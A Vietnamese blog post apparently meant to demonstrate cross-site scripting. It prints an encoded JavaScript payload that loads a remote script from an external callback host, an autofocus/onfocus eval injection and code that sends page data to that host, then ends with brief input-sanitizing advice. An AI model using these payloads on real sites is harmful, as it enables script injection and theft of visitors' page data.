<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="description" content="AhaXu - Personal blog about programming, Haskell, and technology" />
        <meta name="keywords" content="AhaXu, Haskell, programming, technology, blog" />
        
          <meta property="og:url" content="/posts/2022-11-17-xss-attack-sample.html" />
          <meta property="og:title" content="(Vi) XSS attack sample" />
          <meta property="og:description" content="XSS attack sample" />
          <meta property="og:image" content="https://ahaxu.com/images/2022-08-28-hello-world-kyxuan.jpg" />
          <meta name="description" content="XSS attack sample">
          <meta name="keywords" content="security">
        
        <title>AhaXu - (Vi) XSS attack sample</title>
        <link rel="stylesheet" type="text/css" href="../css/default.css" />
        <link rel="stylesheet" type="text/css" href="../css/syntax.css" />
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">

		<!-- Google tag (gtag.js) -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=G-9BSYYJ3166"></script>
		<script>
		  window.dataLayer = window.dataLayer || [];
		  function gtag(){dataLayer.push(arguments);}
		  gtag('js', new Date());
		  gtag('config', 'G-9BSYYJ3166');
		</script>
    </head>
    <body>
        <header class="site-header">
            <div class="container">
                <div class="header-content">
                    <div class="logo">
                        <a href="../">AhaXu</a>
                    </div>
                    <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu" aria-expanded="false" aria-controls="main-nav" aria-haspopup="true" type="button">
                        <span class="sr-only">Menu</span>
                        <span aria-hidden="true"></span>
                        <span aria-hidden="true"></span>
                        <span aria-hidden="true"></span>
                    </button>
                </div>
                
                <nav class="main-nav" id="main-nav" role="navigation" aria-label="Main navigation">
                    <button class="nav-close-btn" id="nav-close-btn" aria-label="Close navigation menu" type="button">
                        <span aria-hidden="true">&times;</span>
                    </button>
                    <a href="../" class="nav-link">Home</a>
                    <a href="../about.html" class="nav-link">About</a>
                    <a href="../tags/thơ%20thẩn.html" class="nav-link">Poetry</a>
                    <a href="../archive.html" class="nav-link">Archive</a>
                </nav>
            </div>
        </header>

        <main class="site-main">
            <div class="container">
                
                    <article class="post-content">
                        <header class="post-header">
                            <h1 class="post-title">(Vi) XSS attack sample</h1>
                        </header>
                        <div class="post-meta">
    <time class="post-date" datetime="November 17, 2022">November 17, 2022</time>
    
        <span class="post-author">by lk</span>
    
</div>

<div class="post-body">
    <p>Disclaimer: Kỹ thuật này có thể đã lạc hậu tại thời điểm bài này đuợc viết ;). Enjoy your day lah ^^.</p>
<p><strong>XSS attack là kỹ thuật tấn công khá phổ biến bên cạnh SQL injection. Hãy cùng xem thử một ví dụ mà attacker inject thành công một đọan mã độc vào hệ thống nhé!</strong></p>
<p>Đầu tiên, hãy chạy đoạn thử js này trong js console</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> <span class="fu">atob</span>(<span class="st">'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'</span>)</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> <span class="st">'var a=document.createElement(&quot;script&quot;);a.src=&quot;https://d0x5.xss.ht&quot;;document.body.appendChild(a);'</span></span></code></pre></div>
<p>một vài browser hiện đại thì đã chặn việc chạy các đoạn mã độc như trên</p>
<pre><code>&gt; # thử eval đoạn mã độc phía trên 
&gt; eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'))

&gt; VM91:1 This document requires 'TrustedScript' assignment and no 'default' policy for 'TrustedScript' has been defined.
(anonymous) @ VM91:1
VM91:1 Uncaught EvalError: Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source of script in the following Content Security Policy directive: &quot;script-src chrome://resources 'self'&quot;.</code></pre>
<p>Nếu bạn tò mò, tận mắt thấy, hãy nhúng đoạn code dưới này vào file html bất kỳ nào đó, mở ở chế độ <strong>private mode</strong></p>
<pre><code>&lt;input
    onfocus=eval(atob(this.id))
    id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7
 autofocus&gt;</code></pre>
<p>link đến thư viện mà attacker xài, https://d0x5.xss.ht/ . Biết đâu bạn có thể modify một vài thông tin gửi về attacker = việc modify data
gửi về cho attacker trong hàm bên dưới</p>
<pre><code>    var http = new XMLHttpRequest();
    var url = &quot;https://d0x5.xss.ht/page_callback&quot;;
    http.open(&quot;POST&quot;, url, true);
    http.setRequestHeader(&quot;Content-type&quot;, &quot;text/plain&quot;);
    http.onreadystatechange = function() {
        if(http.readyState == 4 &amp;&amp; http.status == 200) {

        }
    }
    http.send( JSON.stringify( page_data ) );
}</code></pre>
<p>Hoặc callback luôn bằng curl</p>
<pre><code>&gt; curl -v -XPOST 'https://d0x5.xss.ht/page_callback' -d'{&quot;page_html&quot;:&quot;fuckyou&quot;, &quot;uri&quot;:&quot;fuck you again&quot;}'</code></pre>
<p><strong>Hãy luôn sanitize input data có kiểu string ;) và kỹ hơn nữa thì nên sanitize data load từ database khi render html page.</strong>
Hoặc nên dùng các thư viện ORM có hỗ trợ việc sanitize/ cast các malicious input data này.</p>
<p>Nếu bạn còn tò mò, hãy vọc vạch thêm từ đây https://xsshunter.com/</p>
</div>

                    </article>
                
            </div>
        </main>

        <footer class="site-footer">
            <div class="container">
                <p>&copy; 2025 AhaXu - Built with Hakyll</p>
            </div>
        </footer>

        <script>
            // Mobile menu functionality with accessibility improvements
            document.addEventListener('DOMContentLoaded', function() {
                const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
                const mainNav = document.getElementById('main-nav');
                const navLinks = document.querySelectorAll('.nav-link');
                const navCloseBtn = document.getElementById('nav-close-btn');
                let isMenuOpen = false;
                
                // Focus trap for mobile menu
                function trapFocus(element) {
                    const focusableElements = element.querySelectorAll(
                        'a[href], button, textarea, input[type="text"], input[type="radio"], input[type="checkbox"], select'
                    );
                    const firstFocusableElement = focusableElements[0];
                    const lastFocusableElement = focusableElements[focusableElements.length - 1];
                    
                    element.addEventListener('keydown', function(e) {
                        if (e.key === 'Tab') {
                            if (e.shiftKey) {
                                if (document.activeElement === firstFocusableElement) {
                                    e.preventDefault();
                                    lastFocusableElement.focus();
                                }
                            } else {
                                if (document.activeElement === lastFocusableElement) {
                                    e.preventDefault();
                                    firstFocusableElement.focus();
                                }
                            }
                        }
                    });
                }
                
                // Toggle menu function
                function toggleMenu() {
                    isMenuOpen = !isMenuOpen;
                    
                    if (isMenuOpen) {
                        mainNav.classList.add('active');
                        mobileMenuToggle.classList.add('active');
                        mobileMenuToggle.setAttribute('aria-expanded', 'true');
                        mainNav.setAttribute('aria-hidden', 'false');
                        
                        // Focus first navigation link
                        const firstLink = mainNav.querySelector('.nav-link');
                        if (firstLink) {
                            firstLink.focus();
                        }
                        
                        // Add focus trap
                        trapFocus(mainNav);
                        
                        // Prevent body scroll
                        document.body.style.overflow = 'hidden';
                    } else {
                        closeMenu();
                    }
                }
                
                // Close menu function
                function closeMenu() {
                    isMenuOpen = false;
                    mainNav.classList.remove('active');
                    mobileMenuToggle.classList.remove('active');
                    mobileMenuToggle.setAttribute('aria-expanded', 'false');
                    mainNav.setAttribute('aria-hidden', 'true');
                    
                    // Return focus to toggle button
                    mobileMenuToggle.focus();
                    
                    // Restore body scroll
                    document.body.style.overflow = '';
                }
                
                // Event listeners
                mobileMenuToggle.addEventListener('click', toggleMenu);
                
                // Keyboard support for toggle button
                mobileMenuToggle.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter' || e.key === ' ') {
                        e.preventDefault();
                        toggleMenu();
                    }
                });
                
                // Close menu when clicking on a link
                navLinks.forEach(link => {
                    link.addEventListener('click', closeMenu);
                });

                // Close menu when clicking on the close button
                navCloseBtn.addEventListener('click', closeMenu);
                
                // Close menu when clicking outside
                document.addEventListener('click', function(event) {
                    if (isMenuOpen && !mobileMenuToggle.contains(event.target) && !mainNav.contains(event.target) && (!navCloseBtn || !navCloseBtn.contains(event.target))) {
                        closeMenu();
                    }
                });
                
                // Close menu on Escape key
                document.addEventListener('keydown', function(e) {
                    if (e.key === 'Escape' && isMenuOpen) {
                        closeMenu();
                    }
                });
                
                // Handle window resize
                window.addEventListener('resize', function() {
                    if (window.innerWidth > 768 && isMenuOpen) {
                        closeMenu();
                    }
                });
            });
        </script>
    </body>
</html>
